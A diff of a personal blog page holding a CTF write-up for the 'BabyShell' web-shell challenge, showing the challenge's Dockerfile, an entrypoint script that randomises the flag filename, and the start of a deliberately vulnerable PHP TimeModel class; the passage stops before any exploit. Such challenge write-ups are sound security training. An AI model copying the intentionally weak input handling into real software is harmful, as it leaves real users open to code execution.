@@ -1,240 +1,19 @@
-<!DOCTYPE html>
-<html lang="zh-tw">
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width">
-    <script type="application/javascript" src='http://localhost:1313/js/theme-mode.js'></script>
-    <link rel="stylesheet" href='http://localhost:1313/css/frameworks.min.css' />
-    <link rel="stylesheet" href='http://localhost:1313/css/github.min.css' />
-    <link rel="stylesheet" href='http://localhost:1313/css/github-style.css' />
-    <link rel="stylesheet" href='http://localhost:1313/css/light.css' />
-    <link rel="stylesheet" href='http://localhost:1313/css/dark.css' />
-    <link rel="stylesheet" href='http://localhost:1313/css/syntax.css' />
-    <title>CTF_babyshell - Penguin&#39;s Website</title>
-    
-    <link rel="icon" type="image/x-icon" href='http://localhost:1313/images/favicon.ico'>
-    
-    <meta name="theme-color" content="#1e2327">
-
-    <link rel="stylesheet" href="http://localhost:1313/css/self.css">
-    
-
-    
-    <meta name="description"
-  content="BabyShell 這次的題目是由Chw41出題，題目來源
+<!doctype html><html lang=zh-tw><head><meta charset=utf-8><meta name=viewport content="width=device-width"><script type=application/javascript src=https://lyccyc.github.io/js/theme-mode.js></script><link rel=stylesheet href=https://lyccyc.github.io/css/frameworks.min.css><link rel=stylesheet href=https://lyccyc.github.io/css/github.min.css><link rel=stylesheet href=https://lyccyc.github.io/css/github-style.css><link rel=stylesheet href=https://lyccyc.github.io/css/light.css><link rel=stylesheet href=https://lyccyc.github.io/css/dark.css><link rel=stylesheet href=https://lyccyc.github.io/css/syntax.css><title>CTF_babyshell - Penguin's Website</title><link rel=icon type=image/x-icon href=https://lyccyc.github.io/images/favicon.ico><meta name=theme-color content="#1e2327"><link rel=stylesheet href=https://lyccyc.github.io/css/self.css><meta name=description content="BabyShell 這次的題目是由Chw41出題，題目來源
 Description BabyShell is a Capture The Flag (CTF) challenge designed to test your skills in exploiting a simple web shell technique. The challenge involves leveraging the getTime() function to retrieve the current time, which is crucial for solving the puzzle.
-" />
-<meta name="keywords"
-  content='' />
-<meta name="robots" content="noodp" />
-<link rel="canonical" href="http://localhost:1313/post/ctf_babyshell/" />
-
-
-<meta name="twitter:card" content="summary" />
-<meta name="twitter:title" content="CTF_babyshell - Penguin&#39;s Website" />
-<meta name="twitter:description"
-  content="BabyShell 這次的題目是由Chw41出題，題目來源
+"><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=https://lyccyc.github.io/post/ctf_babyshell/><meta name=twitter:card content="summary"><meta name=twitter:title content="CTF_babyshell - Penguin's Website"><meta name=twitter:description content="BabyShell 這次的題目是由Chw41出題，題目來源
 Description BabyShell is a Capture The Flag (CTF) challenge designed to test your skills in exploiting a simple web shell technique. The challenge involves leveraging the getTime() function to retrieve the current time, which is crucial for solving the puzzle.
-" />
-<meta name="twitter:site" content="http://localhost:1313/" />
-<meta name="twitter:creator" content="" />
-<meta name="twitter:image"
-  content="http://localhost:1313/">
-
-
-<meta property="og:type" content="article" />
-<meta property="og:title" content="CTF_babyshell - Penguin&#39;s Website">
-<meta property="og:description"
-  content="BabyShell 這次的題目是由Chw41出題，題目來源
+"><meta name=twitter:site content="https://lyccyc.github.io/"><meta name=twitter:creator content><meta name=twitter:image content="https://lyccyc.github.io/"><meta property="og:type" content="article"><meta property="og:title" content="CTF_babyshell - Penguin's Website"><meta property="og:description" content="BabyShell 這次的題目是由Chw41出題，題目來源
 Description BabyShell is a Capture The Flag (CTF) challenge designed to test your skills in exploiting a simple web shell technique. The challenge involves leveraging the getTime() function to retrieve the current time, which is crucial for solving the puzzle.
-" />
-<meta property="og:url" content="http://localhost:1313/post/ctf_babyshell/" />
-<meta property="og:site_name" content="CTF_babyshell" />
-<meta property="og:image"
-  content="http://localhost:1313/">
-<meta property="og:image:width" content="2048">
-<meta property="og:image:height" content="1024">
-
-<meta property="article:published_time" content="2025-06-29 22:06:02 &#43;0800 CST" />
-
-
-
-
-
-
-
-
-
-
-
-</head>
-
-
-<body>
-  <div style="position: relative">
-  <header class="Header js-details-container Details px-3 px-md-4 px-lg-5 flex-wrap flex-md-nowrap open Details--on">
-    <div class="Header-item mobile-none" style="margin-top: -4px; margin-bottom: -4px;">
-      <a class="Header-link" href="http://localhost:1313/">
-        <img class="octicon" height="32" width="32" src="">
-      </a>
-    </div>
-    <div class="Header-item d-md-none">
-      <button class="Header-link btn-link js-details-target" type="button"
-        onclick="document.querySelector('#header-search').style.display = document.querySelector('#header-search').style.display == 'none'? 'block': 'none'">
-        <svg height="24" class="octicon octicon-three-bars" viewBox="0 0 16 16" version="1.1" width="24">
-          <path fill-rule="evenodd" d="M1 2.75A.75.75 0 011.75 2h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 2.75zm0 5A.75.75 0 011.75 7h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 7.75zM1.75 12a.75.75 0 100 1.5h12.5a.75.75 0 100-1.5H1.75z">
-          </path>
-        </svg>
-      </button>
-    </div>
-    <div style="display: none;" id="header-search"
-      class="Header-item Header-item--full flex-column flex-md-row width-full flex-order-2 flex-md-order-none mr-0 mr-md-3 mt-3 mt-md-0 Details-content--hidden-not-important d-md-flex">
-      <div
-        class="Header-search header-search flex-auto js-site-search position-relative flex-self-stretch flex-md-self-auto mb-3 mb-md-0 mr-0 mr-md-3 scoped-search site-scoped-search js-jump-to">
-        <div class="position-relative">
-          
-          <form target="_blank" action="https://www.google.com/search" accept-charset="UTF-8" method="get"
-            autocomplete="off">
-            <label
-              class="Header-search-label form-control input-sm header-search-wrapper p-0 js-chromeless-input-container header-search-wrapper-jump-to position-relative d-flex flex-justify-between flex-items-center">
-              <input type="text"
-                class="Header-search-input form-control input-sm header-search-input jump-to-field js-jump-to-field js-site-search-focus js-site-search-field is-clearable"
-                name="q" value="" placeholder="Search" autocomplete="off">
-              <input type="hidden" name="q" value="site:http://localhost:1313/">
-            </label>
-          </form>
-          
-        </div>
-      </div>
-    </div>
-
-    <div class="Header-item Header-item--full flex-justify-center d-md-none position-relative">
-      <a class="Header-link " href="http://localhost:1313/">
-        <img class="octicon octicon-mark-github v-align-middle" height="32" width="32" src="">
-      </a>
-    </div>
-    <div class="Header-item" style="margin-right: 0;">
-      <a href="javascript:void(0)" class="Header-link no-select" onclick="switchTheme()">
-        <svg style="fill: var(--color-profile-color-modes-toggle-moon);" class="no-select" viewBox="0 0 16 16"
-          version="1.1" width="16" height="16">
-          <path fill-rule="evenodd" clip-rule="evenodd"
-            d="M4.52208 7.71754C7.5782 7.71754 10.0557 5.24006 10.0557 2.18394C10.0557 1.93498 10.0392 1.68986 10.0074 1.44961C9.95801 1.07727 10.3495 0.771159 10.6474 0.99992C12.1153 2.12716 13.0615 3.89999 13.0615 5.89383C13.0615 9.29958 10.3006 12.0605 6.89485 12.0605C3.95334 12.0605 1.49286 10.001 0.876728 7.24527C0.794841 6.87902 1.23668 6.65289 1.55321 6.85451C2.41106 7.40095 3.4296 7.71754 4.52208 7.71754Z">
-          </path>
-        </svg>
-      </a>
-    </div>
-  </header>
-</div>
-
-  <div id="search-result" class="container-lg px-3 new-discussion-timeline" style="display: none;">
-</div>
-
-  
-<div class="application-main">
-  <div>
-  <main>
-    <div class="gisthead pagehead bg-gray-light pb-0 pt-3 mb-4">
-      <div class="px-0">
-        <div class="mb-3 d-flex px-3 px-md-3 px-lg-5">
-          <div class="flex-auto min-width-0 width-fit mr-3">
-            <div class="d-flex">
-              <div class="d-none d-md-block">
-                <a class="avatar mr-2 flex-shrink-0" href="http://localhost:1313/">
-                  <img class=" avatar-user"
-                    src="http://localhost:1313/images/avatar.png"
-                    width="32" height="32"></a>
-              </div>
-              <div class="d-flex flex-column">
-                <h1 class="break-word f3 text-normal mb-md-0 mb-1">
-                  <span class="author">
-                    <a href="http://localhost:1313/">陳昱臻(企鵝)</a>
-                  </span>
-                  <span class="path-divider">/</span>
-                  <strong class="css-truncate css-truncate-target mr-1" style="max-width: 410px">
-                    <a href="http://localhost:1313/post/ctf_babyshell/">CTF_babyshell</a>
-                  </strong>
-                </h1>
-                <div class="note m-0">
-                  Created <relative-time datetime="Sun, 29 Jun 2025 22:06:02 &#43;0800"
-                    class="no-wrap">
-                    Sun, 29 Jun 2025 22:06:02 &#43;0800</relative-time>
-
-                  
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <div class="container-lg px-3 new-discussion-timeline">
-      <div class="repository-content gist-content">
-        <div>
-          <div class="js-gist-file-update-container js-task-list-container file-box">
-            <div id="file-pytest" class="file my-2">
-              <div id="post-header" class="file-header d-flex flex-md-items-center flex-items-start sticky-header" style="z-index: 2">
-                <div class="file-info d-flex flex-md-items-center flex-items-start flex-order-1 flex-auto">
-                  <div class="text-mono f6 flex-auto pr-3 flex-order-2 flex-md-order-1 mt-2 mt-md-0">
-                    
-                    <summary id="toc-toggle" onclick="clickToc()" class="btn btn-octicon m-0 mr-2 p-2">
-                      <svg aria-hidden="true" viewBox="0 0 16 16" height="16" width="16" class="octicon octicon-list-unordered">
-                        <path fill-rule="evenodd" d="M2 4a1 1 0 100-2 1 1 0 000 2zm3.75-1.5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zM3 8a1 1 0 11-2 0 1 1 0 012 0zm-1 6a1 1 0 100-2 1 1 0 000 2z"></path>
-                      </svg>
-                    </summary>
-                    <details-menu class="SelectMenu" id="toc-details" style="display: none;">
-                      <div class="SelectMenu-modal rounded-3 mt-1" style="max-height: 340px;">
-                        <div class="SelectMenu-list SelectMenu-list--borderless p-2" style="overscroll-behavior: contain;" id="toc-list">
-                        </div>
-                      </div>
-                    </details-menu>
-                      1055 Words
-                    
-
-                  </div>
-                  <div class="file-actions flex-order-2 pt-0">
-                    
-                    
-                    <a class="muted-link mr-3" href="/tags/ctf">
-                      <svg class="octicon octicon-tag" viewBox="0 0 16 16" version="1.1" width="16" height="16">
-                        <path fill-rule="evenodd"
-                          d="M2.5 7.775V2.75a.25.25 0 01.25-.25h5.025a.25.25 0 01.177.073l6.25 6.25a.25.25 0 010 .354l-5.025 5.025a.25.25 0 01-.354 0l-6.25-6.25a.25.25 0 01-.073-.177zm-1.5 0V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 010 2.474l-5.026 5.026a1.75 1.75 0 01-2.474 0l-6.25-6.25A1.75 1.75 0 011 7.775zM6 5a1 1 0 100 2 1 1 0 000-2z">
-                        </path>
-                      </svg>
-                      CTF
-                    </a>
-                    
-                    <a class="muted-link mr-3" href="/tags/website">
-                      <svg class="octicon octicon-tag" viewBox="0 0 16 16" version="1.1" width="16" height="16">
-                        <path fill-rule="evenodd"
-                          d="M2.5 7.775V2.75a.25.25 0 01.25-.25h5.025a.25.25 0 01.177.073l6.25 6.25a.25.25 0 010 .354l-5.025 5.025a.25.25 0 01-.354 0l-6.25-6.25a.25.25 0 01-.073-.177zm-1.5 0V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 010 2.474l-5.026 5.026a1.75 1.75 0 01-2.474 0l-6.25-6.25A1.75 1.75 0 011 7.775zM6 5a1 1 0 100 2 1 1 0 000-2z">
-                        </path>
-                      </svg>
-                      Website
-                    </a>
-                    
-                    <a class="muted-link mr-3" href="/tags/docker">
-                      <svg class="octicon octicon-tag" viewBox="0 0 16 16" version="1.1" width="16" height="16">
-                        <path fill-rule="evenodd"
-                          d="M2.5 7.775V2.75a.25.25 0 01.25-.25h5.025a.25.25 0 01.177.073l6.25 6.25a.25.25 0 010 .354l-5.025 5.025a.25.25 0 01-.354 0l-6.25-6.25a.25.25 0 01-.073-.177zm-1.5 0V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 010 2.474l-5.026 5.026a1.75 1.75 0 01-2.474 0l-6.25-6.25A1.75 1.75 0 011 7.775zM6 5a1 1 0 100 2 1 1 0 000-2z">
-                        </path>
-                      </svg>
-                      Docker
-                    </a>
-                    
-                    
-                  </div>
-                </div>
-              </div>
-
-
-              <div class="Box-body px-5 pb-5" style="z-index: 1">
-                <article class="markdown-body entry-content container-lg"><h1 id="babyshell">BabyShell</h1>
-<p>這次的題目是由<a href="https://github.com/Chw41">Chw41</a>出題，<a href="https://github.com/Chw41/Individual-CTF-Topic/tree/main/BabyShell">題目來源</a></p>
-<h2 id="description">Description</h2>
-<p>BabyShell is a Capture The Flag (CTF) challenge designed to test your skills in exploiting a simple web shell technique. The challenge involves leveraging the getTime() function to retrieve the current time, which is crucial for solving the puzzle.</p>
-<p>題目環境架構:</p>
-<pre tabindex="0"><code>├── challenge
+"><meta property="og:url" content="https://lyccyc.github.io/post/ctf_babyshell/"><meta property="og:site_name" content="CTF_babyshell"><meta property="og:image" content="https://lyccyc.github.io/"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2025-06-29 22:06:02 +0800 CST"></head><body><div style=position:relative><header class="Header js-details-container Details px-3 px-md-4 px-lg-5 flex-wrap flex-md-nowrap open Details--on"><div class="Header-item mobile-none" style=margin-top:-4px;margin-bottom:-4px><a class=Header-link href=https://lyccyc.github.io/><img class=octicon height=32 width=32 src></a></div><div class="Header-item d-md-none"><button class="Header-link btn-link js-details-target" type=button onclick='document.querySelector("#header-search").style.display=document.querySelector("#header-search").style.display=="none"?"block":"none"'>
+<svg height="24" class="octicon octicon-three-bars" viewBox="0 0 16 16" width="24"><path fill-rule="evenodd" d="M1 2.75A.75.75.0 011.75 2h12.5a.75.75.0 110 1.5H1.75A.75.75.0 011 2.75zm0 5A.75.75.0 011.75 7h12.5a.75.75.0 110 1.5H1.75A.75.75.0 011 7.75zM1.75 12a.75.75.0 100 1.5h12.5a.75.75.0 100-1.5H1.75z"/></svg></button></div><div style=display:none id=header-search class="Header-item Header-item--full flex-column flex-md-row width-full flex-order-2 flex-md-order-none mr-0 mr-md-3 mt-3 mt-md-0 Details-content--hidden-not-important d-md-flex"><div class="Header-search header-search flex-auto js-site-search position-relative flex-self-stretch flex-md-self-auto mb-3 mb-md-0 mr-0 mr-md-3 scoped-search site-scoped-search js-jump-to"><div class=position-relative><form target=_blank action=https://www.google.com/search accept-charset=UTF-8 method=get autocomplete=off><label class="Header-search-label form-control input-sm header-search-wrapper p-0 js-chromeless-input-container header-search-wrapper-jump-to position-relative d-flex flex-justify-between flex-items-center"><input type=text class="Header-search-input form-control input-sm header-search-input jump-to-field js-jump-to-field js-site-search-focus js-site-search-field is-clearable" name=q placeholder=Search autocomplete=off>
+<input type=hidden name=q value=site:https://lyccyc.github.io/></label></form></div></div></div><div class="Header-item Header-item--full flex-justify-center d-md-none position-relative"><a class=Header-link href=https://lyccyc.github.io/><img class="octicon octicon-mark-github v-align-middle" height=32 width=32 src></a></div><div class=Header-item style=margin-right:0><a href=javascript:void(0) class="Header-link no-select" onclick=switchTheme()><svg style="fill:var(--color-profile-color-modes-toggle-moon)" class="no-select" viewBox="0 0 16 16" width="16" height="16"><path fill-rule="evenodd" clip-rule="evenodd" d="M4.52208 7.71754c3.05612.0 5.53362-2.47748 5.53362-5.5336C10.0557 1.93498 10.0392 1.68986 10.0074 1.44961 9.95801 1.07727 10.3495.771159 10.6474.99992c1.4679 1.12724 2.4141 2.90007 2.4141 4.89391.0 3.40575-2.7609 6.16667-6.16665 6.16667-2.94151.0-5.40199-2.0595-6.018122-4.81523C.794841 6.87902 1.23668 6.65289 1.55321 6.85451 2.41106 7.40095 3.4296 7.71754 4.52208 7.71754z"/></svg></a></div></header></div><div id=search-result class="container-lg px-3 new-discussion-timeline" style=display:none></div><div class=application-main><div><main><div class="gisthead pagehead bg-gray-light pb-0 pt-3 mb-4"><div class=px-0><div class="mb-3 d-flex px-3 px-md-3 px-lg-5"><div class="flex-auto min-width-0 width-fit mr-3"><div class=d-flex><div class="d-none d-md-block"><a class="avatar mr-2 flex-shrink-0" href=https://lyccyc.github.io/><img class=avatar-user src=https://lyccyc.github.io/images/avatar.png width=32 height=32></a></div><div class="d-flex flex-column"><h1 class="break-word f3 text-normal mb-md-0 mb-1"><span class=author><a href=https://lyccyc.github.io/>陳昱臻(企鵝)</a>
+</span><span class=path-divider>/</span>
+<strong class="css-truncate css-truncate-target mr-1" style=max-width:410px><a href=https://lyccyc.github.io/post/ctf_babyshell/>CTF_babyshell</a></strong></h1><div class="note m-0">Created <relative-time datetime="Sun, 29 Jun 2025 22:06:02 +0800" class=no-wrap>Sun, 29 Jun 2025 22:06:02 +0800</relative-time></div></div></div></div></div></div></div><div class="container-lg px-3 new-discussion-timeline"><div class="repository-content gist-content"><div><div class="js-gist-file-update-container js-task-list-container file-box"><div id=file-pytest class="file my-2"><div id=post-header class="file-header d-flex flex-md-items-center flex-items-start sticky-header" style=z-index:2><div class="file-info d-flex flex-md-items-center flex-items-start flex-order-1 flex-auto"><div class="text-mono f6 flex-auto pr-3 flex-order-2 flex-md-order-1 mt-2 mt-md-0"><summary id=toc-toggle onclick=clickToc() class="btn btn-octicon m-0 mr-2 p-2"><svg aria-hidden="true" viewBox="0 0 16 16" height="16" width="16" class="octicon octicon-list-unordered"><path fill-rule="evenodd" d="M2 4a1 1 0 100-2 1 1 0 000 2zm3.75-1.5a.75.75.0 000 1.5h8.5a.75.75.0 000-1.5h-8.5zm0 5a.75.75.0 000 1.5h8.5a.75.75.0 000-1.5h-8.5zm0 5a.75.75.0 000 1.5h8.5a.75.75.0 000-1.5h-8.5zM3 8A1 1 0 111 8a1 1 0 012 0zm-1 6a1 1 0 100-2 1 1 0 000 2z"/></svg></summary><details-menu class=SelectMenu id=toc-details style="display: none;"><div class="SelectMenu-modal rounded-3 mt-1" style=max-height:340px><div class="SelectMenu-list SelectMenu-list--borderless p-2" style=overscroll-behavior:contain id=toc-list></div></div></details-menu>1055 Words</div><div class="file-actions flex-order-2 pt-0"><a class="muted-link mr-3" href=/tags/ctf><svg class="octicon octicon-tag" viewBox="0 0 16 16" width="16" height="16"><path fill-rule="evenodd" d="M2.5 7.775V2.75a.25.25.0 01.25-.25h5.025a.25.25.0 01.177.073l6.25 6.25a.25.25.0 010 .354l-5.025 5.025a.25.25.0 01-.354.0l-6.25-6.25A.25.25.0 012.5 7.775zm-1.5.0V2.75C1 1.784 1.784 1 2.75 1h5.025c.464.0.91.184 1.238.513l6.25 6.25a1.75 1.75.0 010 2.474l-5.026 5.026a1.75 1.75.0 01-2.474.0l-6.25-6.25A1.75 1.75.0 011 7.775zM6 5a1 1 0 100 2 1 1 0 000-2z"/></svg>
+CTF
+</a><a class="muted-link mr-3" href=/tags/website><svg class="octicon octicon-tag" viewBox="0 0 16 16" width="16" height="16"><path fill-rule="evenodd" d="M2.5 7.775V2.75a.25.25.0 01.25-.25h5.025a.25.25.0 01.177.073l6.25 6.25a.25.25.0 010 .354l-5.025 5.025a.25.25.0 01-.354.0l-6.25-6.25A.25.25.0 012.5 7.775zm-1.5.0V2.75C1 1.784 1.784 1 2.75 1h5.025c.464.0.91.184 1.238.513l6.25 6.25a1.75 1.75.0 010 2.474l-5.026 5.026a1.75 1.75.0 01-2.474.0l-6.25-6.25A1.75 1.75.0 011 7.775zM6 5a1 1 0 100 2 1 1 0 000-2z"/></svg>
+Website
+</a><a class="muted-link mr-3" href=/tags/docker><svg class="octicon octicon-tag" viewBox="0 0 16 16" width="16" height="16"><path fill-rule="evenodd" d="M2.5 7.775V2.75a.25.25.0 01.25-.25h5.025a.25.25.0 01.177.073l6.25 6.25a.25.25.0 010 .354l-5.025 5.025a.25.25.0 01-.354.0l-6.25-6.25A.25.25.0 012.5 7.775zm-1.5.0V2.75C1 1.784 1.784 1 2.75 1h5.025c.464.0.91.184 1.238.513l6.25 6.25a1.75 1.75.0 010 2.474l-5.026 5.026a1.75 1.75.0 01-2.474.0l-6.25-6.25A1.75 1.75.0 011 7.775zM6 5a1 1 0 100 2 1 1 0 000-2z"/></svg>
+Docker</a></div></div></div><div class="Box-body px-5 pb-5" style=z-index:1><article class="markdown-body entry-content container-lg"><h1 id=babyshell>BabyShell</h1><p>這次的題目是由<a href=https://github.com/Chw41>Chw41</a>出題，<a href=https://github.com/Chw41/Individual-CTF-Topic/tree/main/BabyShell>題目來源</a></p><h2 id=description>Description</h2><p>BabyShell is a Capture The Flag (CTF) challenge designed to test your skills in exploiting a simple web shell technique. The challenge involves leveraging the getTime() function to retrieve the current time, which is crucial for solving the puzzle.</p><p>題目環境架構:</p><pre tabindex=0><code>├── challenge
 │ ├── assets
 │ │ ├── cyberpunk.gif
 │ │ └── favicon.png
@@ -256,267 +35,111 @@ Description BabyShell is a Capture The Flag (CTF) challenge designed to test you
 ├── docker-compose
 ├── entrypoint.sh
 └── flag
-</code></pre><h2 id="solution">Solution</h2>
-<ol>
-<li>建立容器: <code>docker build -t babyshell .</code></li>
-<li>啟動容器: <code>docker run --name=babyshell --rm -p1337:80 -it babyshell</code></li>
-<li>連線到port1337，打開網站，頂部顯示時間:2025-06-29 20:28:26，頁面顯示: 2025-06-29T20:28:26+00:00080</li>
-<li>觀察source code</li>
-</ol>
-<details open> <summary>Dockerfile 程式碼</summary>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">FROM</span> <span class="nx">ubuntu</span><span class="o">:</span><span class="mf">20.04</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Ubuntu Mirror TW
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">RUN</span> <span class="nx">sed</span> <span class="s1">&#39;s@archive.ubuntu.com@free.nchc.org.tw@&#39;</span> <span class="o">-</span><span class="nx">i</span> <span class="o">/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">apt</span><span class="o">/</span><span class="nx">sources</span><span class="o">.</span><span class="k">list</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Setup user
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">RUN</span> <span class="nx">useradd</span> <span class="nx">www</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Install system packeges
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">RUN</span> <span class="nx">apt</span><span class="o">-</span><span class="nx">get</span> <span class="nx">update</span> <span class="o">&amp;&amp;</span> <span class="nx">apt</span><span class="o">-</span><span class="nx">get</span> <span class="nx">install</span> <span class="o">-</span><span class="nx">y</span> <span class="nx">supervisor</span> <span class="nx">nginx</span> <span class="nx">lsb</span><span class="o">-</span><span class="nx">release</span> <span class="nx">wget</span> <span class="nx">software</span><span class="o">-</span><span class="nx">properties</span><span class="o">-</span><span class="nx">common</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Add repos
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">RUN</span> <span class="nx">add</span><span class="o">-</span><span class="nx">apt</span><span class="o">-</span><span class="nx">repository</span> <span class="nx">ppa</span><span class="o">:</span><span class="nx">ondrej</span><span class="o">/</span><span class="nx">php</span>
-</span></span><span class="line"><span class="cl"><span class="nx">RUN</span> <span class="nx">apt</span><span class="o">-</span><span class="nx">get</span> <span class="nx">update</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Install PHP dependencies
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">RUN</span> <span class="nx">apt</span> <span class="nx">update</span> <span class="o">&amp;&amp;</span> <span class="nx">apt</span> <span class="nx">install</span> <span class="nx">php7</span><span class="o">.</span><span class="mi">4</span><span class="o">-</span><span class="nx">fpm</span> <span class="o">-</span><span class="nx">y</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Configure php-fpm and nginx
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">COPY</span> <span class="nx">config</span><span class="o">/</span><span class="nx">fpm</span><span class="o">.</span><span class="nx">conf</span> <span class="o">/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">php</span><span class="o">/</span><span class="mf">7.4</span><span class="o">/</span><span class="nx">fpm</span><span class="o">/</span><span class="nx">php</span><span class="o">-</span><span class="nx">fpm</span><span class="o">.</span><span class="nx">conf</span>
-</span></span><span class="line"><span class="cl"><span class="nx">COPY</span> <span class="nx">config</span><span class="o">/</span><span class="nx">supervisord</span><span class="o">.</span><span class="nx">conf</span> <span class="o">/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">supervisord</span><span class="o">.</span><span class="nx">conf</span>
-</span></span><span class="line"><span class="cl"><span class="nx">COPY</span> <span class="nx">config</span><span class="o">/</span><span class="nx">nginx</span><span class="o">.</span><span class="nx">conf</span> <span class="o">/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">nginx</span><span class="o">/</span><span class="nx">nginx</span><span class="o">.</span><span class="nx">conf</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Copy challenge files
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">COPY</span> <span class="nx">challenge</span> <span class="o">/</span><span class="nx">www</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Copy flag
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">COPY</span> <span class="nx">flag</span> <span class="o">/</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Setup permissions
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">RUN</span> <span class="nx">chown</span> <span class="o">-</span><span class="nx">R</span> <span class="nx">www</span><span class="o">:</span><span class="nx">www</span> <span class="o">/</span><span class="nx">www</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">nginx</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Expose the port nginx is listening on
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">EXPOSE</span> <span class="mi">80</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Generate random flag filename and start supervisord
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">COPY</span> <span class="o">--</span><span class="nx">chown</span><span class="o">=</span><span class="nx">root</span> <span class="nx">entrypoint</span><span class="o">.</span><span class="nx">sh</span> <span class="o">/</span><span class="nx">entrypoint</span><span class="o">.</span><span class="nx">sh</span>
-</span></span><span class="line"><span class="cl"><span class="nx">ENTRYPOINT</span> <span class="p">[</span><span class="s2">&#34;/entrypoint.sh&#34;</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nx">CMD</span> <span class="p">[</span><span class="s2">&#34;/usr/bin/supervisord&#34;</span><span class="p">,</span> <span class="s2">&#34;-c&#34;</span><span class="p">,</span> <span class="s2">&#34;/etc/supervisord.conf&#34;</span><span class="p">]</span>
-</span></span></code></pre></div></details>
-<div class="warning-box">
-<strong>
-程式解讀:
-28行: COPY flag / -> Flag 不在網站目錄 /www 下，而是在容器的根目錄 /
-</strong>
-</div>
-<details open> <summary>entrypoint.sh 程式碼</summary>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
-</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
-</span></span><span class="line"><span class="cl"><span class="c1"># Secure entrypoint</span>
-</span></span><span class="line"><span class="cl">chmod <span class="m">600</span> /entrypoint.sh
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nv">FLAG</span><span class="o">=</span><span class="k">$(</span>cat /dev/urandom <span class="p">|</span> tr -dc <span class="s1">&#39;a-zA-Z0-9&#39;</span> <span class="p">|</span> fold -w <span class="m">5</span> <span class="p">|</span> head -n 1<span class="k">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">mv /flag /flag<span class="nv">$FLAG</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">exec</span> <span class="s2">&#34;</span><span class="nv">$@</span><span class="s2">&#34;</span>
-</span></span></code></pre></div></details>
-<div class="warning-box">
-<strong>
-代表 flag 的檔名會隨機生成一個長度為5個字元的隨機字串，並將原本的 /flag 檔案重新命名為 /flag<隨機字串>
-</strong>
-</div>
-<details open> <summary>TimeModel.php 程式碼</summary>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
-</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">TimeModel</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$format</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">    <span class="p">{</span>
-</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">format</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$format</span><span class="p">);</span>
